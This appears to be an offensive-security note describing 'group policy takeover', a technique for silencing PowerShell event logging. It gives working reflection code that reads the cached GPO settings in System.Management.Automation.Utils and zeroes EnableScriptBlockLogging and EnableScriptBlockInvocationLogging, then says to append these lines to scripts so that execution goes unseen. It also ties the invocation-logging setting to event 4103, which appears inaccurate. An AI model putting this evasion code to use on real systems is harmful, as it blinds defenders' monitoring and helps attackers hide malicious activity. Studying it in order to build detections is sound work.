# Group policy takeover

ETW default disables some features because of the amount of logs they can create. These features can be enabled by 
modifying the GPO (Group Policy Object) settings of their parent policy. Two of the most popular GPO providers 
provide coverage over PowerShell, including script block logging and module logging.

| Event ID | Purpose                     |
|:---------|:----------------------------|
| 4103     | Logs command invocation     |
| 4104     | Logs script block execution |

* Script block logging will log any script blocks executed within a PowerShell session. Introduced in PowerShell v4 and 
improved in PowerShell v5, the ETW provider has two event IDs it will report. Event ID `4104` is important because 
it can expose scripts if not properly obfuscated or hidden. 
* Module logging is a very verbose provider that will log any modules and data sent from it. Introduced in PowerShell v3, 
each module within a PowerShell session acts as a provider and logs its own module. Similar to the previous provider, 
the modules will write events to event ID `4103`. Event ID `4103` is less important because of the amount of logs 
created. Sysadmins limit it or disable it completely.

Module logging and script block logging providers are both enabled from a group policy: 

Administrative Templates -> Windows Components -> Windows PowerShell. 

Within a PowerShell session, system assemblies are loaded in the same security context as users. This means an 
attacker has the same privilege level as the assemblies that cache GPO settings. Using reflection, an attacker can 
obtain the utility dictionary and modify the group policy for either PowerShell provider.

At a high-level a group policy takeover can be broken up into three steps:

1. Obtain group policy settings from the utility cache.
2. Modify generic provider to `0`.
3. Modify the invocation or module definition.

## Code

Use reflection to obtain the type of `System.Management.Automation.Utils` and identify the `cachedGroupPolicySettings` 
GPO cache field:

```text
$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')
$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)
```

Leverage the GPO variable to modify the event provider setting to 0. `EnableScriptBlockLogging` will control `4104` 
events, limiting the visibility of script execution. Writing to the object or registry directly:

```text
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
```

Repeat the previous step with any other provider settings. `EnableScriptBlockInvocationLogging` will control 
`4103` events, limiting the visibility of cmdlet and pipeline execution:

```text
$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
```

Compile these steps together and append them to a PowerShell script.
